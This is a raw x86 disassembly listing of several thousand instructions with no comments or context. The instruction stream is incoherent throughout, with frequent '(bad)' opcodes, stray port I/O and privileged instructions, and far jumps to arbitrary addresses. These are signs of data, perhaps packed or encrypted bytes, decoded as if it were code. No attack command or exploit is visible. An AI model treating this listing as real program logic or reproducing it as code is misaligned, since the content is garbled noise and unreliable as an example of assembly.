  41abc9:	and    al,BYTE PTR [ebx+edi*1+0x64]
  41abcd:	jl     0x41ab8d
  41abcf:	push   ecx
  41abd0:	sbb    eax,DWORD PTR [esi-0x37]
  41abd3:	xchg   esi,eax
  41abd4:	ret    0xcfb4
  41abd7:	fisub  WORD PTR [edi+0x4d190d4e]
  41abdd:	mov    BYTE PTR [edi+ebx*8-0x14933563],al
  41abe4:	mov    ds:0xd2b38df2,eax
  41abe9:	loope  0x41ac23
  41abeb:	dec    edx
  41abec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abed:	push   ebp
  41abee:	sub    eax,0x6c9aeb41
  41abf3:	sub    edx,DWORD PTR [ebx-0x2a13e80d]
  41abf9:	repz fld TBYTE PTR [ebx+0x56]
  41abfd:	xor    edx,DWORD PTR [ebx-0x4fd19dc1]
  41ac03:	in     eax,0xea
  41ac05:	dec    ebp
  41ac06:	push   ds
  41ac07:	push   ebx
  41ac08:	pusha  
  41ac09:	cmp    al,0x92
  41ac0b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41ac0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac0e:	jmp    0x41ac69
  41ac10:	aad    0xe2
  41ac12:	or     ebp,DWORD PTR [edx]
  41ac14:	push   ebp
  41ac15:	fld    TBYTE PTR [eax-0x1f174d89]
  41ac1b:	mov    bh,0xb2
  41ac1d:	je     0x41abd7
  41ac1f:	xor    al,0xcc
  41ac21:	or     edi,DWORD PTR [ebx-0x4c]
  41ac24:	add    ecx,DWORD PTR [edx]
  41ac26:	pop    edi
  41ac27:	hlt    
  41ac28:	fild   QWORD PTR [ebp+0x56]
  41ac2b:	xchg   ebx,eax
  41ac2c:	or     esp,DWORD PTR [edx+ebx*8+0x6d9a62f9]
  41ac33:	cli    
  41ac34:	dec    edx
  41ac35:	outs   dx,BYTE PTR ds:[esi]
  41ac36:	imul   esi,DWORD PTR [edx-0x144a5028],0x281609cf
  41ac40:	mov    bh,0x14
  41ac42:	nop
  41ac43:	mov    ebp,0xc1acc756
  41ac48:	add    eax,0x59180195
  41ac4d:	repz dec edx
  41ac4f:	dec    eax
  41ac50:	icebp  
  41ac51:	dec    esp
  41ac52:	adc    BYTE PTR [edx-0xe],bl
  41ac55:	(bad)  
  41ac56:	jmp    0xca31:0xf8087088
  41ac5d:	retf   0x958a
  41ac60:	xchg   esi,eax
  41ac61:	inc    ebp
  41ac62:	and    al,0xd4
  41ac64:	inc    ebx
  41ac65:	xchg   esp,eax
  41ac66:	mov    al,0x42
  41ac68:	mov    cl,BYTE PTR [edx-0x3412db1f]
  41ac6e:	dec    ebp
  41ac6f:	fwait
  41ac70:	aad    0xb8
  41ac72:	test   eax,0x74cb4801
  41ac77:	(bad)  
  41ac78:	out    0x40,al
  41ac7a:	arpl   WORD PTR [esi],bx
  41ac7c:	push   esi
  41ac7d:	cmp    DWORD PTR [edx+0x60725d7c],ebx
  41ac83:	push   edx
  41ac84:	mov    dl,0x92
  41ac86:	mov    BYTE PTR [eax-0x1a],ah
  41ac89:	cwde   
  41ac8a:	xchg   ebp,eax
  41ac8b:	xor    eax,0x3e7e176a
  41ac90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac91:	fwait
  41ac92:	inc    eax
  41ac93:	fsub   st,st(3)
  41ac95:	jbe    0x41ac31
  41ac97:	loope  0x41acd0
  41ac99:	mov    bl,0x10
  41ac9b:	xor    eax,0x819e6500
  41aca0:	push   ss
  41aca1:	sbb    eax,0x7289ad1c
  41aca6:	in     al,0xf9
  41aca8:	into   
  41aca9:	jo     0x41accf
  41acab:	and    eax,0x74c1eb85
  41acb0:	stc    
  41acb1:	loopne 0x41ac9f
  41acb3:	fadd   st(4),st
  41acb5:	mov    al,BYTE PTR [esi+0x6528e64f]
  41acbb:	jnp    0x41acf2
  41acbd:	loop   0x41acb1
  41acbf:	jecxz  0x41acba
  41acc1:	sti    
  41acc2:	jno    0x41ad1b
  41acc4:	sbb    ebp,DWORD PTR [esi+0x5bf2d005]
  41acca:	dec    ebx
  41accb:	mov    al,0x80
  41accd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acce:	jg     0x41ad38
  41acd0:	pop    esi
  41acd1:	jbe    0x41ad3d
  41acd3:	pop    es
  41acd4:	xor    bl,dh
  41acd6:	stc    
  41acd7:	push   ss
  41acd8:	ins    BYTE PTR es:[edi],dx
  41acd9:	into   
  41acda:	mov    al,0x3b
  41acdc:	push   0xa0a0cdfb
  41ace1:	(bad)  
  41ace2:	fisttp QWORD PTR [ecx]
  41ace4:	scas   al,BYTE PTR es:[edi]
  41ace5:	sbb    dh,BYTE PTR ds:0xa449113
  41aceb:	xchg   ebx,eax
  41acec:	xchg   edx,eax
  41aced:	sub    eax,0x6f895255
  41acf2:	fstp   TBYTE PTR [ebx+0x1970794b]
  41acf8:	mov    ds:0x90a3cda4,al
  41acfd:	xor    eax,0x25086f72
  41ad02:	mov    cl,0xa
  41ad04:	out    dx,eax
  41ad05:	ficomp WORD PTR [edx-0x18]
  41ad08:	pop    ebp
  41ad09:	dec    ebx
  41ad0a:	pop    es
  41ad0b:	push   0xffffffc5
  41ad0d:	dec    edx
  41ad0e:	mov    DWORD PTR [eax+0x45],edi
  41ad11:	dec    esi
  41ad12:	sbb    BYTE PTR ds:0xe4095a6c,ch
  41ad18:	cmp    al,0x18
  41ad1a:	into   
  41ad1b:	cmp    al,0x71
  41ad1d:	mov    edi,0x66b18fab
  41ad22:	rcl    edx,cl
  41ad24:	dec    edi
  41ad25:	xor    DWORD PTR [edi+eiz*2-0x19875e7f],esp
  41ad2c:	mov    bh,0x63
  41ad2e:	das    
  41ad2f:	xchg   edi,eax
  41ad30:	popf   
  41ad31:	test   BYTE PTR es:[edi-0x53],0xbc
  41ad36:	mul    DWORD PTR [edx+0x4e]
  41ad39:	in     eax,0xc8
  41ad3b:	mov    DWORD PTR cs:[edi-0x5f0217cc],esi
  41ad42:	or     esp,DWORD PTR [edi]
  41ad44:	mov    WORD PTR [ebp-0x7c142a78],fs
  41ad4a:	aaa    
  41ad4b:	pop    ebx
  41ad4c:	add    esp,esp
  41ad4e:	jecxz  0x41ad52
  41ad50:	mov    al,ds:0xf4839e0b
  41ad55:	daa    
  41ad56:	in     al,0xef
  41ad58:	sub    ebp,DWORD PTR [ebp+edx*2+0x5b]
  41ad5c:	add    eax,0x2f65c059
  41ad61:	add    al,BYTE PTR [ebp-0x2d]
  41ad64:	clc    
  41ad65:	and    BYTE PTR [ecx+0x41],bl
  41ad68:	dec    ecx
  41ad69:	jns    0x41add7
  41ad6b:	dec    ecx
  41ad6c:	mov    bh,0x4c
  41ad6e:	push   esp
  41ad6f:	cmc    
  41ad70:	addr16 aam 0x0
  41ad73:	stc    
  41ad74:	loop   0x41ad78
  41ad76:	aaa    
  41ad77:	ds pop ds
  41ad79:	mov    ebx,0x90322b52
  41ad7e:	xchg   edi,eax
  41ad7f:	adc    BYTE PTR [ebp+0x5c],ah
  41ad82:	mov    ch,al
  41ad84:	or     DWORD PTR [edx],edx
  41ad86:	sbb    al,0xcc
  41ad88:	outs   dx,BYTE PTR ds:[esi]
  41ad89:	inc    edi
  41ad8a:	test   al,0xe4
  41ad8c:	dec    esi
  41ad8d:	in     al,0x1e
  41ad8f:	sbb    edx,DWORD PTR [ecx-0x56]
  41ad92:	sahf   
  41ad93:	push   ebx
  41ad94:	shr    DWORD PTR [esp+edx*1-0x59],1
  41ad98:	bound  ebp,QWORD PTR [ebp+0x17]
  41ad9b:	jb     0x41ad6f
  41ad9d:	dec    ebx
  41ad9e:	sub    ch,ah
  41ada0:	addr16 mov ds:0xdd30,eax
  41ada4:	pop    ds
  41ada5:	pop    es
  41ada6:	imul   esp,DWORD PTR [eax+0x61412583],0x33
  41adad:	(bad)  
  41adae:	jb     0x41ae04
  41adb0:	pop    esi
  41adb1:	jle    0x41ad5e
  41adb3:	ds out dx,al
  41adb5:	sub    al,0xdd
  41adb7:	loope  0x41ae27
  41adb9:	cmc    
  41adba:	dec    ecx
  41adbb:	loop   0x41add2
  41adbd:	inc    eax
  41adbe:	icebp  
  41adbf:	daa    
  41adc0:	inc    ebx
  41adc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adc2:	mov    ebx,0x8b3aa5c1
  41adc7:	scas   eax,DWORD PTR es:[edi]
  41adc8:	pop    es
  41adc9:	cmp    al,dh
  41adcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adcc:	aam    0xf5
  41adce:	call   0x7659:0x9ee0af92
  41add5:	test   BYTE PTR [edi-0x38],ch
  41add8:	xchg   esi,eax
  41add9:	or     al,0x22
  41addb:	aad    0x70
  41addd:	test   DWORD PTR [ebx-0xb],eax
  41ade0:	and    eax,0x245ae185
  41ade5:	push   cs
  41ade6:	mov    eax,ds:0x36413cc3
  41adeb:	pop    ecx
  41adec:	or     BYTE PTR [ebx-0x3e],bl
  41adef:	mov    dl,0xfd
  41adf1:	sbb    eax,0x345122f4
  41adf6:	xor    DWORD PTR [ebx],esp
  41adf8:	mov    dl,0x70
  41adfa:	retf   0xfd50
  41adfd:	jno    0x41adc1
  41adff:	lods   eax,DWORD PTR ds:[esi]
  41ae00:	mov    dh,0xf3
  41ae02:	xchg   edi,eax
  41ae03:	(bad)  
  41ae04:	adc    eax,0xf4b0046d
  41ae09:	hlt    
  41ae0a:	xchg   ebp,eax
  41ae0b:	mov    dh,0xf4
  41ae0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae0e:	mov    esp,0xa068c342
  41ae13:	cmp    eax,0xd275e14a
  41ae18:	inc    esi
  41ae19:	cdq    
  41ae1a:	loop   0x41adc9
  41ae1c:	jg     0x41ae63
  41ae1e:	sbb    esp,DWORD PTR [ebx-0x6f]
  41ae21:	mov    dh,BYTE PTR [eax+0x8522906]
  41ae27:	mov    edx,0xa7254d19
  41ae2c:	add    ah,bl
  41ae2e:	enter  0xd087,0x5b
  41ae32:	pop    ebp
  41ae33:	mov    ds:0x7918c168,eax
  41ae38:	cmc    
  41ae39:	inc    edi
  41ae3a:	and    eax,0x22b0ad7a
  41ae3f:	adc    edx,DWORD PTR [esi+0x5d4e91e]
  41ae45:	jne    0x41adfb
  41ae47:	dec    ecx
  41ae48:	cmc    
  41ae49:	pushf  
  41ae4a:	icebp  
  41ae4b:	mov    BYTE PTR [ebx+0xb151bf7],bl
  41ae51:	leave  
  41ae52:	and    al,ah
  41ae54:	adc    eax,0x21846af4
  41ae59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae5a:	paddw  mm1,QWORD PTR [edx+0x5dee207b]
  41ae61:	jo     0x41aeb4
  41ae63:	shr    dh,cl
  41ae65:	cwde   
  41ae66:	mov    dh,ah
  41ae68:	and    si,WORD PTR [edi-0x68]
  41ae6c:	shl    BYTE PTR [ebx-0x46a274bb],0x58
  41ae73:	dec    ebx
  41ae74:	jmp    0xcbfa8b5d
  41ae79:	jnp    0x41aeb5
  41ae7b:	xchg   edi,eax
  41ae7c:	and    al,0x37
  41ae7e:	je     0x41ae0d
  41ae80:	lea    esi,[edi+0x3b063c37]
  41ae86:	ins    DWORD PTR es:[edi],dx
  41ae87:	test   al,0xf9
  41ae89:	pop    edx
  41ae8a:	ja     0x41ae54
  41ae8c:	inc    eax
  41ae8d:	xchg   esp,eax
  41ae8e:	icebp  
  41ae8f:	outs   dx,BYTE PTR ds:[esi]
  41ae90:	or     BYTE PTR [edi],bh
  41ae92:	ficomp DWORD PTR [eax]
  41ae94:	rcl    BYTE PTR [ebx+0x44b25417],cl
  41ae9a:	(bad)  [eax]
  41ae9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae9d:	push   esi
  41ae9e:	mov    WORD PTR [ecx],?
  41aea0:	cld    
  41aea1:	fdiv   st,st(3)
  41aea3:	aad    0xd7
  41aea5:	mov    al,0xb3
  41aea7:	add    ecx,DWORD PTR [ebx-0x4082a726]
  41aead:	std    
  41aeae:	xchg   esi,eax
  41aeaf:	ret    
  41aeb0:	js     0x41ae74
  41aeb2:	fnstenv [ecx+0x6f62f601]
  41aeb8:	push   ecx
  41aeb9:	or     eax,0x6ce94c8c
  41aebe:	loop   0x41aee8
  41aec0:	mov    eax,0x421d5dbb
  41aec5:	mov    ecx,0xcfdd01e9
  41aeca:	mov    cl,0x6c
  41aecc:	jbe    0x41af0e
  41aece:	(bad)  
  41aecf:	pop    ebx
  41aed0:	add    BYTE PTR [ecx+0x3f3f1556],al
  41aed6:	cmp    al,0x8e
  41aed8:	inc    ebp
  41aed9:	icebp  
  41aeda:	sub    BYTE PTR [edi-0x64af1a9],ah
  41aee0:	jg     0x41af61
  41aee2:	cmp    edi,DWORD PTR [edx]
  41aee4:	arpl   WORD PTR [edi-0x78],di
  41aee7:	xchg   ebp,eax
  41aee8:	or     DWORD PTR [ecx],eax
  41aeea:	aad    0x38
  41aeec:	(bad)  
  41aeed:	mov    eax,ds:0xd982db9a
  41aef2:	aam    0x57
  41aef4:	mov    bh,0x97
  41aef6:	cmp    bl,BYTE PTR [esi-0x127be558]
  41aefc:	fiadd  DWORD PTR [ebx]
  41aefe:	loopne 0x41af14
  41af00:	(bad)  
  41af01:	out    dx,eax
  41af02:	jecxz  0x41af4c
  41af04:	sbb    ebx,ebp
  41af06:	inc    ecx
  41af07:	lock shl ah,0x36
  41af0b:	add    esi,DWORD PTR [edi+0x4]
  41af0e:	inc    edi
  41af0f:	sub    al,0x1d
  41af11:	lock and eax,0xd24cb9c1
  41af17:	jb     0x41aebf
  41af19:	dec    eax
  41af1a:	fmul   QWORD PTR [edx+0x1b]
  41af1d:	repnz stc 
  41af1f:	push   cs
  41af20:	aam    0xec
  41af22:	cli    
  41af23:	mov    al,0x57
  41af25:	xor    al,0xa
  41af27:	jae    0x41aeae
  41af29:	sahf   
  41af2a:	leave  
  41af2b:	or     cl,BYTE PTR [edi-0x69]
  41af2e:	inc    eax
  41af2f:	lahf   
  41af30:	fbld   TBYTE PTR [ebx+ecx*1+0x28]
  41af34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af35:	outs   dx,BYTE PTR ds:[esi]
  41af36:	xor    bl,BYTE PTR [eax]
  41af38:	mov    eax,ds:0xa7e9b813
  41af3d:	je     0x41afbc
  41af3f:	inc    esi
  41af40:	inc    ecx
  41af41:	test   DWORD PTR [si-0x15],ecx
  41af45:	xor    BYTE PTR [ebx],dh
  41af47:	and    ebx,DWORD PTR [ecx]
  41af49:	pop    eax
  41af4a:	pop    ds
  41af4b:	dec    esi
  41af4c:	dec    esp
  41af4d:	mov    al,0x5d
  41af4f:	mov    esp,DWORD PTR [ecx-0x6b8a3b0b]
  41af55:	je     0x41aeee
  41af57:	jnp    0x41af5f
  41af59:	gs pop ds
  41af5b:	call   0xaf67:0x2b45ce1e
  41af62:	sub    esi,DWORD PTR [edi+ebx*4+0x3a]
  41af66:	adc    ebx,edx
  41af68:	and    al,0x63
  41af6a:	(bad)  
  41af6b:	test   al,0x2e
  41af6d:	pop    ss
  41af6e:	jns    0x41af0b
  41af70:	inc    esp
  41af71:	jmp    0x1a25:0x67245d6a
  41af78:	inc    ebx
  41af79:	inc    ebp
  41af7a:	add    ch,dh
  41af7c:	mov    dl,0x5a
  41af7e:	test   al,0x90
  41af80:	mov    bh,0x9d
  41af82:	bound  esp,QWORD PTR [esp+edi*2-0x6d]
  41af86:	add    DWORD PTR [ecx+edx*4+0x7f],esp
  41af8a:	xchg   ecx,eax
  41af8b:	push   ebx
  41af8c:	test   al,0x56
  41af8e:	ficomp DWORD PTR [edi+0xa]
  41af91:	mov    cl,0xbc
  41af93:	lahf   
  41af94:	mov    ?,WORD PTR [esi+0x7a]
  41af97:	jb     0x41af30
  41af99:	adc    bl,cl
  41af9b:	xchg   edi,eax
  41af9c:	in     al,0x51
  41af9e:	mov    eax,0x293a02aa
  41afa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afa4:	sbb    eax,0x350ed1cd
  41afa9:	pop    esp
  41afaa:	inc    esp
  41afab:	add    bh,cl
  41afad:	pop    esp
  41afae:	xchg   ecx,eax
  41afaf:	stc    
  41afb0:	jl     0x41afc1
  41afb2:	push   0x63d3ab2e
  41afb7:	outs   dx,BYTE PTR ds:[esi]
  41afb8:	sub    al,0x36
  41afba:	mov    ebx,0x77ec92fd
  41afbf:	pop    esi
  41afc0:	stc    
  41afc1:	(bad)  
  41afc2:	sahf   
  41afc3:	sar    BYTE PTR [edx+0x2c],1
  41afc6:	fbstp  TBYTE PTR [ecx-0x4b981b7d]
  41afcc:	pop    edx
  41afcd:	enter  0xd29e,0xe3
  41afd1:	jmp    0xd60d:0x30ac619
  41afd8:	(bad)  
  41afd9:	aaa    
  41afda:	popa   
  41afdb:	pop    esi
  41afdc:	mov    bl,0x49
  41afde:	in     al,dx
  41afdf:	jle    0x41afbe
  41afe1:	mov    eax,esi
  41afe3:	jmp    DWORD PTR [esi+0x3a]
  41afe6:	retf   
  41afe7:	das    
  41afe8:	out    0x7d,eax
  41afea:	push   esp
  41afeb:	dec    ebp
  41afec:	jmp    0xe672:0xf0cfe435
  41aff3:	jle    0x41b038
  41aff5:	stos   BYTE PTR es:[edi],al
  41aff6:	jge    0x41affc
  41aff8:	sub    DWORD PTR [esi],esp
  41affa:	shr    BYTE PTR [ebp-0x39],0xa0
  41affe:	aaa    
  41afff:	rcr    DWORD PTR [eax+0x671cda0b],0x5d
  41b006:	daa    
  41b007:	add    BYTE PTR [eax],al
  41b009:	jecxz  0x41b048
  41b00b:	sub    al,0x32
  41b00d:	ror    dl,0x7
  41b010:	inc    edi
  41b011:	out    dx,al
  41b012:	popf   
  41b013:	add    al,0xe
  41b015:	dec    esi
  41b016:	pxor   mm6,QWORD PTR [esi]
  41b019:	or     BYTE PTR [ebx+0x61c77a6d],ah
  41b01f:	pop    eax
  41b020:	cdq    
  41b021:	mov    esp,0xa7344dd
  41b026:	adc    eax,0xf8096c03
  41b02b:	push   0x324ad1e9
  41b030:	mov    edx,0xcea0d641
  41b035:	imul   edx,DWORD PTR [ebx-0x76],0x9b479294
  41b03c:	test   edi,0xd0e95f37
  41b042:	jmp    0x2663277
  41b047:	jg     0x41b0c2
  41b049:	daa    
  41b04a:	or     ebx,DWORD PTR [eax]
  41b04c:	imul   edi,DWORD PTR [esi+0x25],0xffffffc1
  41b050:	scas   al,BYTE PTR es:[edi]
  41b051:	add    bl,BYTE PTR [edi-0x5b]
  41b054:	push   ebp
  41b055:	mov    ch,BYTE PTR [ecx-0x1a]
  41b058:	jmp    0x30ebbeab
  41b05d:	leave  
  41b05e:	cs in  eax,dx
  41b060:	pop    ebx
  41b061:	jno    0x41b0aa
  41b063:	jle    0x41b040
  41b065:	mov    edx,0xc84b5c98
  41b06a:	in     al,0xe3
  41b06c:	adc    DWORD PTR [ecx],ebp
  41b06e:	lds    ecx,FWORD PTR [ebp+0x789d2bf2]
  41b074:	pop    eax
  41b075:	xor    edi,DWORD PTR [ecx-0x22]
  41b078:	js     0x41b021
  41b07a:	cmp    bh,BYTE PTR [edi+0x6ab00536]
  41b080:	xor    ah,BYTE PTR [edi-0xa]
  41b083:	sbb    eax,0xdd934fab
  41b088:	sbb    al,0xc5
  41b08a:	mov    bh,0x7d
  41b08c:	xchg   ecx,eax
  41b08d:	rol    BYTE PTR [eax-0x68],cl
  41b090:	mov    eax,0x77c89f6f
  41b095:	jg     0x41b074
  41b097:	push   edi
  41b098:	das    
  41b099:	pop    ss
  41b09a:	inc    ebp
  41b09b:	mov    ds:0xf8e1c5a9,al
  41b0a0:	inc    eax
  41b0a1:	(bad)  
  41b0a2:	iret   
  41b0a3:	sti    
  41b0a4:	ja     0x41b02a
  41b0a6:	jmp    0x66171ed8
  41b0ab:	retf   0x950c
  41b0ae:	jmp    0xadbb:0x36026000
  41b0b5:	pop    eax
  41b0b6:	rol    cl,cl
  41b0b8:	mov    gs,ebp
  41b0ba:	sbb    edx,edx
  41b0bc:	repnz or ebp,0x55b88171
  41b0c3:	mov    al,ds:0xb545a94e
  41b0c8:	mov    esp,0xc047e043
  41b0cd:	stc    
  41b0ce:	xor    al,0xa5
  41b0d0:	xchg   edx,eax
  41b0d1:	jb     0x41b100
  41b0d3:	pop    ds
  41b0d4:	lahf   
  41b0d5:	push   ss
  41b0d6:	cs push esp
  41b0d8:	int3   
  41b0d9:	stos   BYTE PTR es:[edi],al
  41b0da:	call   0x8b22e369
  41b0df:	fcom   QWORD PTR [ecx-0x7c]
  41b0e2:	cmp    ch,ah
  41b0e4:	pop    esi
  41b0e5:	(bad)  
  41b0e6:	mul    BYTE PTR [ebp+edx*4+0x4d]
  41b0ea:	cli    
  41b0eb:	cmp    ah,bh
  41b0ed:	mov    ds:0x6af86622,al
  41b0f2:	pop    edx
  41b0f3:	pop    edx
  41b0f4:	cdq    
  41b0f5:	mov    esp,0xb56b6b6e
  41b0fa:	xlat   BYTE PTR ds:[ebx]
  41b0fb:	mov    ds:0xb3f7b8b5,al
  41b100:	(bad)  
  41b101:	(bad)  
  41b102:	popa   
  41b103:	lock cmc 
  41b105:	mov    al,0x2
  41b107:	mov    dh,BYTE PTR [ebx+eax*8+0x0]
  41b10b:	test   DWORD PTR [esi-0x783d3c09],ebp
  41b111:	mov    esp,DWORD PTR [ebp+0x2b]
  41b114:	jb     0x41b0c1
  41b116:	mov    bh,0x34
  41b118:	pop    ebp
  41b119:	out    0x1f,eax
  41b11b:	test   DWORD PTR [ecx],edx
  41b11d:	fist   DWORD PTR [ecx]
  41b11f:	add    DWORD PTR [esi+0x236c3364],ebx
  41b125:	adc    cx,WORD PTR [edx]
  41b128:	inc    ecx
  41b129:	mov    eax,DWORD PTR [eax]
  41b12b:	and    DWORD PTR [edx-0x47453d47],ebp
  41b131:	or     ebx,DWORD PTR [eax-0x18]
  41b134:	mov    ah,0x19
  41b136:	sbb    DWORD PTR [ecx+ebp*1+0x6d],eax
  41b13a:	jp     0x41b0d3
  41b13c:	mov    ds:0xbaf3885a,al
  41b141:	xchg   edi,ebx
  41b143:	ins    BYTE PTR es:[edi],dx
  41b144:	jb     0x41b129
  41b146:	in     eax,dx
  41b147:	aas    
  41b148:	jnp    0x41b166
  41b14a:	adc    bh,al
  41b14c:	push   edx
  41b14d:	sahf   
  41b14e:	and    eax,0xbe45f84d
  41b153:	dec    edx
  41b154:	mov    ch,0xa7
  41b156:	pop    esp
  41b157:	es pop ss
  41b159:	cdq    
  41b15a:	push   es
  41b15b:	add    eax,0xeb12798f
  41b160:	rcr    BYTE PTR [edx+esi*2-0x1d],1
  41b164:	or     al,0x94
  41b166:	jp     0x41b10a
  41b168:	xchg   esp,eax
  41b169:	es sahf 
  41b16b:	xchg   BYTE PTR [edi],bh
  41b16d:	les    ebp,FWORD PTR [edi+0x1d]
  41b170:	fidiv  DWORD PTR [ebx-0x5bdf288c]
  41b176:	push   0x25
  41b178:	pop    esi
  41b179:	not    DWORD PTR [edx-0x6e097e87]
  41b17f:	iret   
  41b180:	mov    esp,DWORD PTR [edx]
  41b182:	and    ecx,edi
  41b184:	imul   ebx,DWORD PTR [ecx],0xffffffbf
  41b187:	sbb    eax,0xe80ba8d1
  41b18c:	push   0x4617ee12
  41b191:	imul   edx,DWORD PTR [ebx+0x46405299],0x2e6d0ff5
  41b19b:	test   al,0x3d
  41b19d:	jnp    0x41b1a4
  41b19f:	jbe    0x41b1aa
  41b1a1:	sbb    eax,0x66289872
  41b1a6:	mov    eax,ds:0x36a0880c
  41b1ab:	sub    BYTE PTR [ebx+0x6b],dh
  41b1ae:	(bad)  
  41b1af:	fisttp QWORD PTR [esp+ebp*4+0x18f7fec3]
  41b1b6:	je     0x41b177
  41b1b8:	out    0xc0,eax
  41b1ba:	nop
  41b1bb:	and    eax,0x51f6f18c
  41b1c0:	sub    ch,BYTE PTR [ecx-0x4466165f]
  41b1c6:	outs   dx,BYTE PTR ds:[esi]
  41b1c7:	or     bl,bh
  41b1c9:	aas    
  41b1ca:	push   ebx
  41b1cb:	mov    eax,ds:0x4b5ca056
  41b1d0:	(bad)  
  41b1d1:	out    0x64,eax
  41b1d3:	sbb    BYTE PTR [esi-0x363def7d],cl
  41b1d9:	or     dl,BYTE PTR [edx+0x6b]
  41b1dc:	push   edx
  41b1dd:	repz xor DWORD PTR [ebp-0x11],edi
  41b1e1:	lahf   
  41b1e2:	(bad)  
  41b1e3:	es sbb eax,0xd6870f52
  41b1e9:	jb     0x41b1bb
  41b1eb:	xor    ebp,edx
  41b1ed:	jge    0x41b1c0
  41b1ef:	ror    DWORD PTR [edx-0x6a],cl
  41b1f2:	pop    ebx
  41b1f3:	jns    0x41b247
  41b1f5:	bound  ebx,QWORD PTR [ebp+0x79b33247]
  41b1fb:	and    DWORD PTR [esi-0x2d7c6423],edx
  41b201:	test   DWORD PTR [ebx+0x46153adf],0xc8faa5d1
  41b20b:	dec    ebp
  41b20c:	xor    DWORD PTR [eax-0x33],0x5cd5e945
  41b213:	add    al,0x8f
  41b215:	repnz sahf 
  41b217:	aas    
  41b218:	test   al,0xff
  41b21a:	inc    esi
  41b21b:	xchg   edx,eax
  41b21c:	std    
  41b21d:	cwde   
  41b21e:	mov    ecx,0x654ee51a
  41b223:	repz xchg ecx,eax
  41b225:	mov    dh,0xae
  41b227:	jne    0x41b26b
  41b229:	push   0xfffffff7
  41b22b:	add    dl,BYTE PTR [eax]
  41b22d:	jp     0x41b224
  41b22f:	cmp    eax,0xb1ce46eb
  41b234:	pop    esp
  41b235:	mov    cl,0xc6
  41b237:	ja     0x41b223
  41b239:	ficom  DWORD PTR [esi]
  41b23b:	(bad)  
  41b23c:	mov    cl,ch
  41b23e:	hlt    
  41b23f:	dec    ebp
  41b240:	and    eax,DWORD PTR [ebx-0x5725f966]
  41b246:	jmp    0x41b2c3
  41b248:	jp     0x41b29a
  41b24a:	xchg   ebp,eax
  41b24b:	les    edx,FWORD PTR [esi-0x23]
  41b24e:	in     al,0xe0
  41b250:	loop   0x41b276
  41b252:	inc    esp
  41b253:	popa   
  41b254:	xchg   edx,eax
  41b255:	and    DWORD PTR [edx-0x552c57a5],eax
  41b25b:	xor    al,BYTE PTR [eax+ebp*8-0x3f]
  41b25f:	pop    ds
  41b260:	jb     0x41b219
  41b262:	sbb    eax,0x836f0d88
  41b267:	push   ecx
  41b268:	mov    eax,ds:0xb31a8155
  41b26d:	mov    ecx,0x8d345949
  41b272:	cli    
  41b273:	mov    ah,0xb9
  41b275:	ficomp WORD PTR [edx+0x75c0510d]
  41b27b:	sahf   
  41b27c:	dec    esi
  41b27d:	mov    dl,al
  41b27f:	ins    DWORD PTR es:[edi],dx
  41b280:	inc    ebp
  41b281:	pop    es
  41b282:	pop    ss
  41b283:	sub    esp,DWORD PTR [esi-0x2f]
  41b286:	inc    ebp
  41b287:	push   cs
  41b288:	mov    esi,0x9fe5e9e3
  41b28d:	mov    ah,0xf7
  41b28f:	add    DWORD PTR [eax+0x78],edx
  41b292:	iret   
  41b293:	shl    eax,1
  41b295:	lahf   
  41b296:	imul   ebx,DWORD PTR [esi+0x3e32139d],0x2425ae28
  41b2a0:	out    0xe3,al
  41b2a2:	sub    eax,0xd8976e8f
  41b2a7:	popf   
  41b2a8:	inc    ecx
  41b2a9:	or     BYTE PTR [edi+0x1e],dl
  41b2ac:	add    al,0x3e
  41b2ae:	or     eax,0x554f3820
  41b2b3:	cmp    eax,ebx
  41b2b5:	jge    0x41b2ce
  41b2b7:	int3   
  41b2b8:	sub    DWORD PTR [esi+edx*2],ebp
  41b2bb:	(bad)  
  41b2bc:	dec    edx
  41b2bd:	inc    ebx
  41b2be:	test   eax,0xb9d6e154
  41b2c3:	pop    ecx
  41b2c4:	jae    0x41b27e
  41b2c6:	mov    dl,0xf5
  41b2c8:	sahf   
  41b2c9:	add    eax,0x24ccb00c
  41b2ce:	es push esp
  41b2d0:	(bad)  
  41b2d1:	shl    esi,1
  41b2d3:	mov    BYTE PTR [eax-0x7f],bh
  41b2d6:	jg     0x41b2f6
  41b2d8:	bound  ebp,QWORD PTR [edx-0x18]
  41b2db:	ins    BYTE PTR es:[edi],dx
  41b2dc:	ds mov ebp,0xe9e4a9d0
  41b2e2:	(bad)  
  41b2e3:	add    eax,0x64e38292
  41b2e8:	dec    esi
  41b2e9:	jbe    0x41b369
  41b2eb:	push   ds
  41b2ec:	pop    eax
  41b2ed:	aad    0x92
  41b2ef:	dec    esi
  41b2f0:	adc    eax,0xc557ef5b
  41b2f5:	out    0x18,al
  41b2f7:	or     eax,0x89bdb371
  41b2fc:	pop    edi
  41b2fd:	inc    eax
  41b2fe:	clc    
  41b2ff:	push   edi
  41b300:	js     0x41b2df
  41b302:	mov    fs,WORD PTR [edi-0x2192bb21]
  41b308:	pop    ss
  41b309:	dec    ebp
  41b30a:	in     al,dx
  41b30b:	add    eax,0x61768337
  41b310:	loope  0x41b361
  41b312:	mov    dh,BYTE PTR [ecx+edi*2+0x28]
  41b316:	ret    
  41b317:	jecxz  0x41b2ba
  41b319:	fist   DWORD PTR es:[edx]
  41b31c:	sub    BYTE PTR [edi-0x714d706c],0x7b
  41b323:	les    edx,FWORD PTR [edi-0x72a336a7]
  41b329:	jmp    0x6ca0:0x28c91b10
  41b330:	mov    ch,0x62
  41b332:	xor    ah,BYTE PTR [edi-0xe]
  41b335:	mov    ebp,0xe660cbc2
  41b33a:	cmp    BYTE PTR [ebp-0x13169884],bh
  41b340:	in     al,dx
  41b341:	(bad)  
  41b342:	retf   0xd33e
  41b345:	test   al,0xcf
  41b347:	sbb    DWORD PTR [eax+0x0],0xffffff90
